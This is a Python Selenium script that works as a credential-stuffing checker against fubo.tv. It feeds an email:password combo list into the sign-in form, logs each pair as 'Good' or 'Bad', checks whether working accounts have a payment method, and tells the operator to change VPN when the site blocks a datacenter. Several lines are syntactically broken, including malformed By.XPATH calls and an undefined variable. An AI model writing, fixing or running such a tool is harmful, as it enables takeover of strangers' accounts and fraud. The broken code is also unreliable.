import time
import requests
from bs4 import BeautifulSoup as soup

from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium import webdriver
from pathlib import Path

file_directory = str(Path(__file__).parent)+'/fubo'
page = 'https://www.fubo.tv/signin'
get_current_ip = 'https://www.iplocation.net/'
info_list =[]
request = requests.get(get_current_ip)
parse_request = soup(request.content,'html.parser')
get_Location = parse_request.find('table',attrs={'class':'iptable'})
location = get_Location.find_all('td')
for line in location:
	info_list.append(line.text.strip())
if 'US' not in info_list[2]:
	print('Non-US IP\nThe Program will only work for US IP Adresses.\nEnding.')
	exit()

users = []
passwords = []

with open(file_directory, 'r') as espn:
	
	for line in espn.readlines():
		users.append(line.split(':')[0].strip())
		passwords.append(line.split(':')[1].strip())

for index in range(len(users)):
	with open('account_results','a') as account_results:
		try:
			browser = webdriver.Chrome()
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(3)
			email_box = browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div/div[1]/main/div/div[1]/form/div/div[1]/div[1]/input')
			email_box.send_keys(users[index])
			time.sleep(1)
			password_box = browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div/div[1]/main/div/div[1]/form/div/div[2]/div[2]/div[1]/input')
			password_box .send_keys(passwords[index])
			time.sleep(1)
			log_in = browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div/div[1]/main/div/div[1]/form/div/div[3]/button')
			log_in.click()
			time.sleep(3)
			if browser.find_elements(By.XPATH'//*[@id="__next"]/div/div[1]/main/div[1]/div[2]/div[1]/h2'):
				no_payment_method = browser.find_element(By.XPATH'//*[@id="__next"]/div/div[1]/main/div[1]/div[2]/div[1]/h2').text:
				if 'Start your free trial' in no_payment_method:
					print("No Payment Method.")
			error = invalid_email_text.text
			if 'That email and password combination is not valid.' in str(error):
				account_results.write(users[index]+':'+passwords[index]+' ---> Bad \n')
				browser.close()
			if 'Something went wrong' in str(error):
				print('Please change vpn, this datacenter is banned\n')
				print('Finished at combo {}\n'.format(users[index]+':'+passwords[index]))
				browser.close()
				exit()
		except (NoSuchElementException, ElementClickInterceptedException):
			account_results.write(users[index]+':'+passwords[index]+' ---> Good \n')
			browser.close()
			continue
